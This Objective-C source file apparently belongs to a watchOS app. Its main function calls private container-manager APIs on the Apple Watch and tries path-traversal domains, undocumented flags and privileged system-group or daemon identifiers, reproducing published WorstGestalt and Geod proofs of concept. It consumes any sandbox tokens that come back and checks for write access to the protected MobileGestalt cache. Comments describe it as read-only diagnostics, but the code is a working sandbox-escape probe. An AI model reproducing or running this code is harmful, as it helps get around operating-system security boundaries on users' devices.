#import "BQRouteProbe.h"
#import "BQCore.h"
#import "BQSystemAudit.h"
#import <WatchKit/WatchKit.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <sys/stat.h>
#import <sys/utsname.h>
#import <sys/sysctl.h>

typedef void *(*BQCreateFn)(void);
typedef void (*BQSetU64Fn)(void *, uint64_t);
typedef void (*BQSetObjFn)(void *, void *);
typedef void *(*BQXPCStringCreateFn)(const char *);
typedef void (*BQXPCReleaseFn)(void *);
typedef void (*BQSetStrFn)(void *, const char *);
typedef void *(*BQResultFn)(void *);
typedef char *(*BQCopyTokenFn)(void *);
typedef const char *(*BQPathFn)(void *);
typedef void (*BQFreeFn)(void *);
typedef int64_t (*BQConsumeFn)(const char *);
typedef int64_t (*BQReleaseFn)(int64_t);

typedef void *(*BQErrorFn)(void *);
typedef int (*BQErrorIntFn)(void *);

typedef struct {
    void *library;
    BQErrorFn lastError;
    BQPathFn errorMessage;
    BQErrorIntFn errorPosix;
    BQCreateFn create;
    BQSetU64Fn setClass;
    BQSetObjFn setIdentifiers;
    BQSetObjFn setGroupIdentifiers;
    BQSetU64Fn setFlags;
    BQSetU64Fn setPart;
    BQSetStrFn setDomain;
    BQResultFn getResult;
    BQCopyTokenFn copyToken;
    BQPathFn getPath;
    BQFreeFn freeQuery;
    BQConsumeFn consumeToken;
    BQReleaseFn releaseToken;
    BQXPCStringCreateFn createXPCString;
    BQXPCReleaseFn releaseXPCObject;
} BQProbeAPI;

static void *BQSymbol(void *library, const char *preferred, const char *legacy) {
    void *symbol = library ? dlsym(library, preferred) : NULL;
    if (!symbol && legacy && library) symbol = dlsym(library, legacy);
    return symbol;
}

static BQProbeAPI BQLoadProbeAPI(void) {
    BQProbeAPI api = {0};
    api.library = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                         RTLD_NOW | RTLD_LOCAL);
    api.create = (BQCreateFn)BQSymbol(api.library, "container_query_create", NULL);
    api.setClass = (BQSetU64Fn)BQSymbol(api.library, "container_query_set_class", NULL);
    api.setIdentifiers = (BQSetObjFn)BQSymbol(api.library, "container_query_set_identifiers", NULL);
    api.setGroupIdentifiers = (BQSetObjFn)BQSymbol(api.library, "container_query_set_group_identifiers", NULL);
    api.setFlags = (BQSetU64Fn)BQSymbol(api.library, "container_query_operation_set_flags",
                                        "container_query_set_flags");
    api.setPart = (BQSetU64Fn)BQSymbol(api.library, "container_query_operation_set_part",
                                       "container_query_set_part");
    api.setDomain = (BQSetStrFn)BQSymbol(api.library, "container_query_operation_set_part_domain",
                                         "container_query_set_part_domain");
    api.getResult = (BQResultFn)BQSymbol(api.library, "container_query_get_single_result", NULL);
    api.copyToken = (BQCopyTokenFn)BQSymbol(api.library, "container_copy_sandbox_token", NULL);
    api.getPath = (BQPathFn)BQSymbol(api.library, "container_object_get_path", NULL);
    api.freeQuery = (BQFreeFn)BQSymbol(api.library, "container_query_free", NULL);
    api.consumeToken = (BQConsumeFn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    api.releaseToken = (BQReleaseFn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    api.createXPCString = (BQXPCStringCreateFn)dlsym(RTLD_DEFAULT, "xpc_string_create");
    api.releaseXPCObject = (BQXPCReleaseFn)dlsym(RTLD_DEFAULT, "xpc_release");
    api.lastError = (BQErrorFn)BQSymbol(api.library, "container_query_get_last_error", NULL);
    api.errorMessage = (BQPathFn)BQSymbol(api.library, "container_error_get_message", NULL);
    api.errorPosix = (BQErrorIntFn)BQSymbol(api.library, "container_error_get_posix_errno", NULL);
    return api;
}

static NSString *BQDots(unsigned count) {
    NSMutableArray<NSString *> *components = [NSMutableArray arrayWithCapacity:count];
    for (unsigned i = 0; i < count; ++i) [components addObject:@".."];
    return [components componentsJoinedByString:@"/"];
}

static NSString *BQOpenCheck(NSString *path, int flags) {
    errno = 0;
    int fd = open(path.fileSystemRepresentation, flags | O_CLOEXEC);
    int status = errno;
    if (fd < 0) {
        return [NSString stringWithFormat:@"DENIED errno=%d (%s)", status, strerror(status)];
    }
    struct stat st = {0};
    int statStatus = fstat(fd, &st);
    close(fd); // Deliberately no read/write/truncate/fchmod/rename operation.
    if (statStatus != 0) return @"OPEN OK; fstat failed";
    return [NSString stringWithFormat:@"OPEN OK; regular=%@ size=%lld",
            S_ISREG(st.st_mode) ? @"YES" : @"NO", (long long)st.st_size];
}

static void BQRunQueryPart(NSMutableString *log, const BQProbeAPI *api, NSString *name,
                       uint64_t classNumber, NSString *identifier, BOOL isGroup,
                       NSString *domain, uint64_t flags, NSString *targetFile, uint64_t part) {
    [log appendFormat:@"\n=== %@ ===\nclass=%llu group=%@ part=%llu flags=0x%llx\npartDomain=%@\n",
        name, (unsigned long long)classNumber, identifier, (unsigned long long)part,
        (unsigned long long)flags, domain.length ? domain : @"(empty)"];

    [log appendFormat:@"before query O_RDWR: %@\n", BQOpenCheck(targetFile, O_RDWR)];
    if (!api->create || !api->setClass || !api->setFlags ||
        !api->getResult || !api->copyToken || !api->consumeToken ||
        !api->releaseToken || !api->freeQuery ||
        !api->createXPCString || !api->releaseXPCObject || !api->setPart ||
        (isGroup && !api->setGroupIdentifiers) ||
        (!isGroup && !api->setIdentifiers) ||
        (domain.length && !api->setDomain)) {
        [log appendString:@"SKIPPED: required MCM symbol missing\n"];
        return;
    }

    void *query = api->create();
    if (!query) {
        [log appendString:@"SKIPPED: unable to construct query\n"];
        return;
    }

    api->setClass(query, classNumber);
    void *xIdentifier = api->createXPCString(identifier.UTF8String);
    if (!xIdentifier) {
        [log appendString:@"SKIPPED: cannot construct XPC identifier\n"];
        api->freeQuery(query);
        return;
    }
    if (isGroup) api->setGroupIdentifiers(query, xIdentifier);
    else api->setIdentifiers(query, xIdentifier);
    if (xIdentifier) api->releaseXPCObject(xIdentifier);
    if (api->setPart) api->setPart(query, part);
    if (domain.length) api->setDomain(query, domain.UTF8String);
    api->setFlags(query, flags);

    void *result = api->getResult(query);
    const char *rawPath = result && api->getPath ? api->getPath(result) : NULL;
    NSString *returnedPath = rawPath ? [NSString stringWithUTF8String:rawPath] : nil;
    char *token = result ? api->copyToken(result) : NULL;
    [log appendFormat:@"result=%@ returnedPath=%@ token=%@\n",
        result ? @"YES" : @"NO", returnedPath ?: @"(none)",
        token ? @"YES" : @"NO"];
    // The public query error can be empty even when the server refuses a token.
    void *queryError = api->lastError ? api->lastError(query) : NULL;
    const char *message = queryError && api->errorMessage ? api->errorMessage(queryError) : NULL;
    [log appendFormat:@"MCM error API=%@ error=%@ posix=%d message=%s\n",
        api->lastError ? @"YES" : @"NO", queryError ? @"YES" : @"NO",
        queryError && api->errorPosix ? api->errorPosix(queryError) : 0,
        message ?: "(none; does not rule out server-side token denial)"];
    int64_t handle = -1;
    if (token) {
        // Log only known class names, never the full bearer token.
        const char *classes[] = {"com.apple.sandbox.system-group",
            "com.apple.app-sandbox.read-write", "com.apple.app-sandbox.read"};
        NSString *tokenClass = @"unrecognized";
        for (unsigned i = 0; i < 3; ++i) {
            if (strstr(token, classes[i])) { tokenClass = @(classes[i]); break; }
        }
        [log appendFormat:@"token class hint=%@ (text match only)\n", tokenClass];
        errno = 0;
        handle = api->consumeToken(token);
        int consumeError = errno;
        if (handle < 0) [log appendFormat:@"consume errno=%d\n", consumeError];
        [log appendFormat:@"sandbox_extension_consume=%lld\n", (long long)handle];
        free(token);
    } else {
        [log appendString:@"sandbox_extension_consume=NOT ATTEMPTED\n"];
    }

    // IMPORTANT: the only filesystem operation below is open(2), followed by
    // fstat(2) and close(2). O_RDWR does not write to the file on its own.
    [log appendFormat:@"sandbox policy after token: %@\n", BQSandboxPolicySummary(targetFile)];
    [log appendFormat:@"target=%@\nO_RDONLY: %@\nO_RDWR: %@\n",
        targetFile, BQOpenCheck(targetFile, O_RDONLY),
        BQOpenCheck(targetFile, O_RDWR)];
    if (handle >= 0) {
        int64_t released = api->releaseToken(handle);
        [log appendFormat:@"release=%lld; after release O_RDWR: %@\n",
            (long long)released, BQOpenCheck(targetFile, O_RDWR)];
    }
    api->freeQuery(query);
}

static void BQRunQuery(NSMutableString *log, const BQProbeAPI *api, NSString *name,
                      uint64_t cls, NSString *identifier, BOOL group,
                      NSString *domain, uint64_t flags, NSString *target) {
    BQRunQueryPart(log, api, name, cls, identifier, group, domain, flags, target, 3);
}

NSString *BQRunRouteDiagnostics(void) {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"DIAGNOSTICS v3 — token, entitlement, sandbox, daemon and cross-device controls\n"];
    char build[128] = {0};
    size_t buildSize = sizeof(build);
    if (sysctlbyname("kern.osversion", build, &buildSize, NULL, 0) != 0)
        snprintf(build, sizeof(build), "unavailable");
    build[sizeof(build) - 1] = 0;
    [log appendFormat:@"OS build=%s | timestamp=%@\n", build, [NSDate date]];
    struct utsname u = {0};
    uname(&u);
    [log appendFormat:@"watchOS %@ | machine %s | kernel %s\n",
        [WKInterfaceDevice currentDevice].systemVersion, u.machine, u.release];
    [log appendString:@"READ-ONLY TEST: never alters MobileGestalt data.\n"];

    NSString *cache = @"/private/var/containers/Shared/SystemGroup/"
                      "systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSString *privatePath = [cache stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSString *varPath = [privatePath hasPrefix:@"/private/var/"]
        ? [@"/var/" stringByAppendingString:[privatePath substringFromIndex:@"/private/var/".length]]
        : privatePath;

    [log appendFormat:@"\nBASELINE (without new sandbox extension)\nO_RDONLY: %@\nO_RDWR: %@\n",
        BQOpenCheck(privatePath, O_RDONLY), BQOpenCheck(privatePath, O_RDWR)];

    BQProbeAPI api = BQLoadProbeAPI();
    [log appendFormat:@"\nMCM loaded=%@ setPart=%@ setDomain=%@\n",
        api.library ? @"YES" : @"NO", api.setPart ? @"YES" : @"NO",
        api.setDomain ? @"YES" : @"NO"];
    if (!api.library) {
        [log appendString:BQSystemAudit()];
        return log;
    }

    NSString *group = @"systemgroup.com.apple.mobilegestaltcache";

    // Controls vary one dimension at a time. These are not claimed bypasses.
    // The low path bit requests a returned path; it does not add file access.
    uint64_t types[] = {UINT64_C(0x0100000000), UINT64_C(0x0900000000),
                        UINT64_C(0x4100000000), UINT64_C(0x8100000000)};
    NSString *names[] = {@"path only", @"type 1", @"type 2", @"type 3"};
    NSString *ownID = [[NSBundle mainBundle] bundleIdentifier];
    for (unsigned i = 0; i < 4; ++i) {
        if (ownID.length) BQRunQuery(log, &api,
            [@"Own Class2 API control / " stringByAppendingString:names[i]],
            2, ownID, NO, @"", types[i], privatePath);
        BQRunQuery(log, &api, [@"Geod direct / " stringByAppendingString:names[i]],
            12, @"com.apple.geod", NO, @"", types[i], privatePath);
        BQRunQuery(log, &api, [@"Class13 Caches direct / " stringByAppendingString:names[i]],
            13, group, YES, @"", types[i], privatePath);
        BQRunQueryPart(log, &api, [@"Class13 root direct / " stringByAppendingString:names[i]],
            13, group, YES, @"", types[i], privatePath, 0);
    }

    // Exact WorstGestalt file-level Class 13 approach, including /var alias,
    // dots(8) traversal, and flags=0x8000000000.
    BQRunQuery(log, &api, @"WorstGestalt Class13 file (/var alias)",
               13, group, YES, [BQDots(8) stringByAppendingString:varPath],
               UINT64_C(0x8000000000), varPath);
    BQRunQuery(log, &api, @"WorstGestalt Class13 file (/private/var)",
               13, group, YES, [BQDots(8) stringByAppendingString:privatePath],
               UINT64_C(0x8000000000), privatePath);

    // Control: direct system-group request as seen in HermesEnabler.
    BQRunQuery(log, &api, @"HermesEnabler Class13 direct (control)",
               13, group, YES, @"", UINT64_C(0x8100000000), privatePath);

    // Critical differential probe: 0x0800000000 is 0x800000000, NOT
    // 0x8000000000. On a published Watch6,14 / 23U95 investigation it
    // returned a com.apple.sandbox.system-group token, but O_RDWR still
    // failed because token consumption != sandbox file-write-data grant.
    BQRunQuery(log, &api, @"Class13 direct / system-group token probe (0x0800000000)",
               13, group, YES, @"", UINT64_C(0x0800000000), privatePath);

    // This checks whether the *same lower flag* changes per-file traversal
    // independently of the previously tested WorstGestalt high-bit flag.
    BQRunQuery(log, &api, @"Class13 per-file / lower-flag differential (0x0800000000)",
               13, group, YES, [BQDots(8) stringByAppendingString:privatePath],
               UINT64_C(0x0800000000), privatePath);

    // The published Geod Class12 proof of concept uses six ".." path segments
    // from the geod system container before descending into SystemGroup.
    NSString *geodDomain = [BQDots(6) stringByAppendingString:
        @"/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"];
    BQRunQuery(log, &api, @"Geod Class12 published traversal",
               12, @"com.apple.geod", NO, geodDomain,
               UINT64_C(0x8100000000), privatePath);

    // Alternative *entry containers*, not more MobileGestalt flag guesses.
    // This only requests metadata/extensions: it never creates or modifies
    // any InstallCoordination or eligibilityd state. Their presence is NOT a
    // working confused-deputy exploit.
    BQRunQuery(log, &api, @"InstallCoordination Class13 direct entry only",
               13, @"systemgroup.com.apple.installcoordinationd", YES, @"",
               UINT64_C(0x8100000000), privatePath);
    BQRunQuery(log, &api, @"InstallCoordination Class13 DataPromises traversal (NO WRITE)",
               13, @"systemgroup.com.apple.installcoordinationd", YES,
               @"../InstallCoordination/DataPromises",
               UINT64_C(0x8000000000), privatePath);
    BQRunQuery(log, &api, @"Eligibilityd Class12 NeverRestore (NO WRITE)",
               12, @"com.apple.eligibilityd", NO, @"NeverRestore",
               UINT64_C(0x8100000000), privatePath);

    // Extend the same run with every original selectable fallback.
    [log appendString:BQRunExistingFallbackDiagnostics()];
    [log appendString:BQSystemAudit()];
    [log appendString:@"\nINTERPRETATION:\n"
        "The lower flag 0x0800000000 may return a system-group token without granting file-write-data.\n"
        "Only O_RDWR OPEN OK on the protected file is evidence of writable-open permission.\n"
        "A successful query, token, or readable file alone is insufficient.\n"
        "O_RDWR OPEN OK does not prove safe MobileGestalt editing or Hermès face eligibility.\n"];
    // Save only to our app's Documents folder; never write the system cache.
    NSString *documents = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    [[NSFileManager defaultManager] createDirectoryAtPath:documents
                              withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *reportPath = [documents stringByAppendingPathComponent:@"watchos26-route-diagnostics.txt"];
    NSError *writeError = nil;
    if ([log writeToFile:reportPath atomically:YES encoding:NSUTF8StringEncoding error:&writeError]) {
        [log appendFormat:@"\nReport saved in app sandbox: %@\n", reportPath];
    } else {
        [log appendFormat:@"\nCould not save report in app sandbox: %@\n", writeError];
    }
    return log;
}
